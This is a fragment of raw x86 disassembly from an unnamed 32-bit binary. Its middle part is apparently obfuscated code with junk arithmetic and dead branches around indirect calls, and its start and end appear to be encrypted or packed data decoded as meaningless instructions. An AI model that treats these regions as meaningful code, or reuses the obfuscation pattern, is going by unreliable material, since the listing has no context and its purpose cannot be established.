  4158fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158fe:	loopne 0x415903
  415900:	adc    bh,0xfc
  415903:	push   edi
  415904:	scas   al,BYTE PTR es:[edi]
  415905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415906:	push   es
  415907:	xchg   edi,eax
  415908:	pushf  
  415909:	xchg   esi,eax
  41590a:	mov    dh,0xa3
  41590c:	adc    eax,0xdab155f6
  415911:	loop   0x4158b5
  415913:	inc    esi
  415914:	pushf  
  415915:	sub    DWORD PTR [edx],edx
  415917:	jae    0x415967
  415919:	aad    0x16
  41591b:	push   edi
  41591c:	cmp    BYTE PTR [esi+ebx*2-0x22],cl
  415920:	cmp    BYTE PTR [esi],al
  415922:	jmp    0xcb21:0xaf5f515f
  415929:	call   0xd0d1f80b
  41592e:	or     DWORD PTR [ebp-0x59c540e1],edi
  415934:	xor    al,0x9e
  415936:	pop    ecx
  415937:	ins    BYTE PTR es:[edi],dx
  415938:	jno    0x415945
  41593a:	leave  
  41593b:	dec    ebx
  41593c:	jnp    0x415941
  41593e:	mov    ds:0x645a6ae7,al
  415943:	fs jmp 0x4159be
  415946:	adc    ebx,DWORD PTR [ecx+0x58afaa19]
  41594c:	sbb    DWORD PTR [esi-0x6195afe4],ebx
  415952:	fisubr WORD PTR [ecx-0x1b]
  415955:	jb     0x415925
  415957:	pcmpgtw mm1,mm1
  41595a:	sub    DWORD PTR [ebp+0x16722992],0x68
  415961:	adc    BYTE PTR [ebx],0xbf
  415964:	sub    bl,BYTE PTR [edx+0x3c]
  415967:	add    DWORD PTR [esi-0x50],ebp
  41596a:	and    cl,BYTE PTR [eax-0x6b]
  41596d:	pop    ebp
  41596e:	arpl   WORD PTR [edx-0x5c5be8b0],ax
  415974:	call   0x6464:0x8bdc51fe
  41597b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41597c:	xor    bl,bh
  41597e:	packssdw mm3,QWORD PTR [esi+0x6f5ca1f]
  415985:	mov    ss,esi
  415987:	cmp    al,0x0
  415989:	dec    eax
  41598a:	mov    edi,0xecb76c32
  41598f:	push   0xa66d0189
  415994:	adc    eax,0xfe4f012
  415999:	shl    al,1
  41599b:	push   cs
  41599c:	cmp    cl,BYTE PTR [esi-0x270b8342]
  4159a2:	xcrypt-ofb (bad)
  4159a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159a4:	test   eax,0xd7bbe132
  4159a9:	js     0x415998
  4159ab:	nop
  4159ac:	push   esi
  4159ad:	pushf  
  4159ae:	stos   BYTE PTR es:[edi],al
  4159af:	popa   
  4159b0:	adc    esi,DWORD PTR [ebx+0x4c16be5]
  4159b6:	addr16 xchg edi,eax
  4159b8:	cmp    BYTE PTR [eax-0x5b650d71],0xc2
  4159bf:	pop    esp
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42821b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428357,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x4281eb,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42814b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282af
  415a48:	cmp    DWORD PTR ds:0x4281eb,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ea4
  415a74:	mov    edi,DWORD PTR ds:0x42817f
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x42819f
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428137
  415a8f:	and    DWORD PTR ds:0x428363,edx
  415a95:	xor    DWORD PTR ds:0x428203,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282b7,ecx
  415aa5:	adc    DWORD PTR ds:0x42812b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428133
  415ac7:	xor    DWORD PTR ds:0x42825f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281af
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x42826b
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428343,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42820f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x42818f
  415b25:	mov    edx,DWORD PTR ds:0x4281df
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42834f,0x0
  415b3a:	not    DWORD PTR ds:0x4282d3
  415b40:	mov    DWORD PTR ds:0x42822b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428123,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428333,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42834f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42811b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e3c
  415b83:	add    DWORD PTR ds:0x42832b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x4282df,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282ab
  415ba0:	adc    DWORD PTR ds:0x4282e7,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42813f,0x0
  415bb5:	mov    DWORD PTR ds:0x428137,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282b7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42813f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428217
  415bef:	call   DWORD PTR ds:0x428e40
  415bf5:	sub    edi,DWORD PTR ds:0x428363
  415bfb:	sbb    DWORD PTR ds:0x4282e7,ecx
  415c01:	and    edx,DWORD PTR ds:0x428157
  415c07:	mov    edi,DWORD PTR ds:0x4281ff
  415c0d:	and    DWORD PTR ds:0x42813b,edi
  415c13:	or     DWORD PTR ds:0x428133,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x428163
  415c23:	mov    edx,DWORD PTR ds:0x4282eb
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42832f,0x0
  415c38:	mov    DWORD PTR ds:0x42835b,ebx
  415c3e:	mov    DWORD PTR ds:0x42812f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42814b,edx
  415c4f:	cmp    DWORD PTR ds:0x42832f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x4282cb
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428d90
  415c88:	mov    edi,DWORD PTR ds:0x428187
  415c8e:	mov    edx,DWORD PTR ds:0x42830f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x4282e7,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x4281ff
  415cab:	mov    eax,ds:0x422398
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225b8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42834b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42823b
  415cd7:	mov    ebx,DWORD PTR ds:0x428363
  415cdd:	mov    DWORD PTR ds:0x428203,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42833b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42834b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428d94
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428227
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42823f,0x428223
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x4282cf,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x4282e7,0x0
  415d58:	mov    DWORD PTR ds:0x428243,0x5216
  415d62:	not    DWORD PTR ds:0x42821b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42823b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42825b,ebx
  415d82:	cmp    DWORD PTR ds:0x4282e7,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x42807b
  415d94:	push   0x428029
  415d99:	call   DWORD PTR ds:0x428d98
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42823f
  415dab:	sbb    DWORD PTR ds:0x428363,edx
  415db1:	or     DWORD PTR ds:0x428343,ebx
  415db7:	sbb    DWORD PTR ds:0x428263,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x4282df,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42811f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428117,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42815b,0x428123
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42815b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42832f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428237,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x428263,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42820f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42823f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x4282c7,0x42814f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428133,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x4282df,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42814f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428257,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428133,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428d9c
  415ec4:	or     DWORD PTR ds:0x4281f3,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42832b,0x174
  415ede:	mov    DWORD PTR ds:0x42834f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42834b
  415eee:	add    edx,DWORD PTR ds:0x42812f
  415ef4:	mov    DWORD PTR ds:0x42834b,edx
  415efa:	or     DWORD PTR ds:0x428337,ecx
  415f00:	mov    edx,DWORD PTR ds:0x4282e7
  415f06:	or     DWORD PTR ds:0x428247,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428257,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x4282df,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428113,0x0
  415f3b:	mov    DWORD PTR ds:0x428137,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428337
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x4282d7,ebx
  415f59:	cmp    DWORD PTR ds:0x428113,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ea8
  415f91:	xor    DWORD PTR ds:0x428367,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428243
  415f9d:	sub    DWORD PTR ds:0x4281ff,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42833b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x4282e3
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428333,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42814b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42814b
  415fdc:	add    DWORD PTR ds:0x428233,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x4281ff,0x0
  415fec:	mov    DWORD PTR ds:0x428353,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x428367,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428333,0x1cd3
  416015:	mov    DWORD PTR ds:0x42812f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x4281ff,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428eac
  416037:	add    DWORD PTR ds:0x428133,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x4282d7,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42820f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428207
  41605c:	adc    DWORD PTR ds:0x42822b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42835b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x4282c7,0x42823f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42814f,0x0
  416089:	mov    DWORD PTR ds:0x4282e7,0x1e83
  416093:	mov    DWORD PTR ds:0x428343,edx
  416099:	movzx  ecx,WORD PTR ds:0x42821b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428153
  4160ad:	cmp    DWORD PTR ds:0x42814f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428da0
  4160c6:	adc    DWORD PTR ds:0x4282db,edi
  4160cc:	or     DWORD PTR ds:0x42821b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x4281ef
  4160dc:	sub    DWORD PTR ds:0x42814b,ecx
  4160e2:	add    DWORD PTR ds:0x42823f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422518
  4160f5:	and    ecx,DWORD PTR ds:0x42822f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42833b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428353,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42814b,0x0
  416120:	mov    DWORD PTR ds:0x428333,0x7b16
  41612a:	mov    DWORD PTR ds:0x42814f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42822b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42814b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428eb0
  416159:	xor    DWORD PTR ds:0x428127,0x42811b
  416163:	sub    DWORD PTR ds:0x428113,0x42813f
  41616d:	sbb    DWORD PTR ds:0x42824f,0x428247
  416177:	and    DWORD PTR ds:0x42823f,0x56d1
  416181:	xor    DWORD PTR ds:0x42822b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42821f,0x42815b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x4281cf
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428153,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42814b,0x428227
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42824b,0x42820b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x4282d7,0x4281eb
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428243,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	xlat   BYTE PTR ds:[ebx]
  416310:	out    dx,eax
  416311:	aaa    
  416312:	push   0xfffffff4
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx-0x38e7e7ec],bl
  41631c:	test   BYTE PTR [eax+0x44345526],bl
  416322:	in     al,0xb8
  416324:	sbb    eax,0x598ce884
  416329:	mov    eax,ds:0x6829f158
  41632e:	bnd call 0x3e0dc06
  416334:	retf   
  416335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416336:	das    
  416337:	aam    0xb7
  416339:	imul   BYTE PTR [eax]
  41633b:	into   
  41633c:	ds pop eax
  41633e:	push   esp
  41633f:	rcr    BYTE PTR [edx],1
  416341:	pop    ebx
  416342:	xchg   esp,eax
  416343:	xor    eax,DWORD PTR [edi]
  416345:	add    BYTE PTR [ecx],bl
  416347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416348:	and    BYTE PTR [edi],al
  41634a:	jecxz  0x416326
  41634c:	push   ds
  41634d:	iret   
  41634e:	das    
  41634f:	add    bh,ah
  416351:	aam    0xb4
  416353:	outs   dx,BYTE PTR ds:[si]
  416355:	mov    dl,0x14
  416357:	mov    ecx,0xfb0d7c5e
  41635c:	scas   al,BYTE PTR es:[di]
  41635e:	or     ebp,DWORD PTR [ebp+0x1745fee0]
  416364:	fimul  DWORD PTR [edx-0x64]
  416367:	pop    ss
  416368:	or     eax,0xe5e1f66d
  41636d:	fstp   QWORD PTR ds:0xdda73892
  416373:	repnz mov edx,0xe5315e91
  416379:	arpl   ax,cx
  41637b:	aaa    
  41637c:	iret   
  41637d:	gs (bad) 
  416380:	or     esp,DWORD PTR [edx+0x69]
  416383:	mov    edx,0xf0a3270
  416388:	ret    
  416389:	mov    al,ds:0x3d8ef5c1
  41638e:	sbb    al,0x86
  416390:	outs   dx,BYTE PTR ds:[esi]
  416391:	mov    bl,0x7
  416393:	daa    
  416394:	mov    eax,0x5f8bee5c
  416399:	xchg   DWORD PTR [ecx+0x7da4084a],esp
  41639f:	fidivr WORD PTR [esi-0x20]
  4163a2:	or     edi,edi
  4163a4:	ja     0x4163fa
  4163a6:	jl     0x41636c
  4163a8:	pushf  
  4163a9:	ret    
  4163aa:	les    eax,FWORD PTR [ebp-0x1b]
  4163ad:	sub    ah,BYTE PTR [eax]
  4163af:	cmp    eax,0x9c2486ec
  4163b4:	clc    
  4163b5:	fwait
  4163b6:	pop    ebp
  4163b7:	ins    DWORD PTR es:[edi],dx
  4163b8:	mov    es,edi
  4163ba:	es or  al,0xe
  4163bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163be:	gs repnz xchg ebx,eax
  4163c1:	mov    bl,BYTE PTR [eax-0x1b]
  4163c4:	and    BYTE PTR ds:0x22fac8ec,cl
  4163ca:	loopne 0x41642a
  4163cc:	(bad)  
  4163cd:	cli    
  4163ce:	mov    ch,0xb8
  4163d0:	(bad)  
  4163d1:	mov    DWORD PTR [edx-0x6a],esi
  4163d4:	nop
  4163d5:	push   ecx
  4163d6:	inc    esi
  4163d7:	vaddps xmm3,xmm5,xmm7
  4163dc:	cmp    bl,dh
  4163de:	icebp  
  4163df:	cmc    
  4163e0:	jle    0x416394
  4163e2:	mov    WORD PTR [edi+0x3bde9b45],es
  4163e8:	cmp    DWORD PTR ds:0xe85b,eax
  4163ed:	push   0xc60c0835
  4163f2:	xor    BYTE PTR ds:0xa8ab38d0,ch
  4163f8:	and    esi,DWORD PTR [esi-0x7f]
  4163fb:	cwde   
  4163fc:	xchg   edi,eax
  4163fd:	aam    0xad
  4163ff:	mov    ah,0x23
  416401:	aaa    
  416402:	or     ebx,DWORD PTR [ecx]
  416404:	mov    BYTE PTR [eax],dh
  416406:	iret   
  416407:	mov    dh,0x4
